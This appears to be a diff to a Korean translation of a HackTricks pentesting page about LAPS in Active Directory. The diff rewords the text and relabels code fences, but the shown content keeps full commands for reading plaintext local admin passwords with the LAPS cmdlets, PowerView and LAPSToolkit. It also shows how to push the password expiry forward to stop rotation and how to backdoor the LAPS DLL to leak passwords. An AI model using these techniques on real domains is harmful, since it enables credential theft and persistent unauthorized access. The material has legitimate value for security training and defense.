@@ -3,13 +3,13 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## 기본 정보
+## Basic Information
 
-Local Administrator Password Solution (LAPS)는 **고유하고 무작위이며 자주 변경되는** **관리자 비밀번호**가 도메인에 가입된 컴퓨터에 적용되는 시스템을 관리하는 데 사용되는 도구입니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, Access Control Lists (ACLs)를 통해 권한이 부여된 사용자만 접근할 수 있습니다. 클라이언트에서 서버로의 비밀번호 전송 보안은 **Kerberos version 5**와 **Advanced Encryption Standard (AES)**의 사용으로 보장됩니다.
+Local Administrator Password Solution (LAPS)는 **고유하고 무작위이며 자주 변경되는** **관리자 비밀번호**를 도메인에 가입된 컴퓨터에 적용하는 시스템을 관리하는 데 사용되는 도구입니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, Access Control Lists (ACLs)를 통해 권한이 부여된 사용자만 접근할 수 있습니다. 클라이언트에서 서버로의 비밀번호 전송 보안은 **Kerberos version 5**와 **Advanced Encryption Standard (AES)**의 사용으로 보장됩니다.
 
-도메인의 컴퓨터 객체에서 LAPS의 구현은 두 개의 새로운 속성인 **`ms-mcs-AdmPwd`**와 **`ms-mcs-AdmPwdExpirationTime`**의 추가로 이어집니다. 이러한 속성은 각각 **일반 텍스트 관리자 비밀번호**와 **만료 시간**을 저장합니다.
+도메인의 컴퓨터 객체에서 LAPS의 구현은 두 개의 새로운 속성인 **`ms-mcs-AdmPwd`**와 **`ms-mcs-AdmPwdExpirationTime`**의 추가로 이어집니다. 이 속성들은 각각 **일반 텍스트 관리자 비밀번호**와 **만료 시간**을 저장합니다.
 
-### 활성화 여부 확인
+### Check if activated
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -24,10 +24,10 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS 비밀번호 접근
 
-`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **원시 LAPS 정책을 다운로드**한 다음, [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지의 **`Parse-PolFile`**을 사용하여 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.
+당신은 **원시 LAPS 정책을 다운로드**할 수 있습니다 `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` 그리고 **`Parse-PolFile`**를 사용하여 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지에서 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.
 
-또한, **네이티브 LAPS PowerShell cmdlets**는 우리가 접근할 수 있는 머신에 설치되어 있다면 사용할 수 있습니다:
-```powershell
+게다가, **네이티브 LAPS PowerShell cmdlets**는 우리가 접근할 수 있는 머신에 설치되어 있다면 사용할 수 있습니다:
+```bash
 Get-Command *AdmPwd*
 
 CommandType     Name                                               Version    Source
@@ -48,7 +48,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
 **PowerView**는 **누가 비밀번호를 읽을 수 있는지와 그것을 읽는지** 알아내는 데에도 사용될 수 있습니다:
-```powershell
+```bash
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 
@@ -59,8 +59,8 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 
 The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)는 여러 기능을 통해 LAPS의 열거를 용이하게 합니다.\
 하나의 기능은 **LAPS가 활성화된 모든 컴퓨터에 대한 `ExtendedRights`**를 파싱하는 것입니다. 이는 **LAPS 비밀번호를 읽도록 특별히 위임된 그룹**을 보여주며, 이러한 그룹은 종종 보호된 그룹의 사용자입니다.\
-**도메인에 컴퓨터를 가입시킨 계정**은 해당 호스트에 대한 `All Extended Rights`를 받으며, 이 권한은 **비밀번호를 읽을 수 있는 능력**을 부여합니다. 열거를 통해 호스트에서 LAPS 비밀번호를 읽을 수 있는 사용자 계정을 보여줄 수 있습니다. 이는 LAPS 비밀번호를 읽을 수 있는 **특정 AD 사용자**를 **타겟팅하는 데** 도움이 될 수 있습니다.
-```powershell
+**도메인에 컴퓨터를 가입시킨** **계정**은 해당 호스트에 대해 `All Extended Rights`를 받으며, 이 권한은 **계정**이 **비밀번호를 읽을 수 있는** 능력을 부여합니다. 열거를 통해 호스트에서 LAPS 비밀번호를 읽을 수 있는 사용자 계정을 보여줄 수 있습니다. 이는 LAPS 비밀번호를 읽을 수 있는 **특정 AD 사용자**를 **타겟팅하는 데** 도움이 될 수 있습니다.
+```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
 
@@ -104,7 +104,7 @@ Password: 2Z@Ae)7!{9#Cq
 ### **만료 날짜**
 
 관리자가 되면, **비밀번호를 얻고** **비밀번호 업데이트를 방지**하기 위해 **만료 날짜를 미래로 설정**할 수 있습니다.
-```powershell
+```bash
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 
@@ -113,11 +113,11 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 > [!WARNING]
-> 비밀번호는 **admin**이 **`Reset-AdmPwdPassword`** cmdlet을 사용할 경우 여전히 재설정됩니다. 또는 LAPS GPO에서 **정책에 의해 요구되는 것보다 긴 비밀번호 만료 시간을 허용하지 않음**이 활성화된 경우에도 마찬가지입니다.
+> 비밀번호는 **admin**이 **`Reset-AdmPwdPassword`** cmdlet을 사용하거나 LAPS GPO에서 **정책에 의해 요구되는 것보다 긴 비밀번호 만료 시간을 허용하지 않음**이 활성화된 경우 여전히 재설정됩니다.
 
 ### 백도어
 
-LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으며, 따라서 코드에 백도어를 삽입하는 것이 가능합니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부) 이는 어떤 식으로든 **새 비밀번호를 유출하거나 어딘가에 저장**할 수 있습니다.
+LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으므로, 코드에 백도어를 넣는 것이 가능합니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부) 이 백도어는 어떤 식으로든 **새 비밀번호를 유출하거나 어딘가에 저장**할 수 있습니다.
 
 그런 다음, 새로운 `AdmPwd.PS.dll`을 컴파일하고 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드합니다 (그리고 수정 시간을 변경합니다).
 
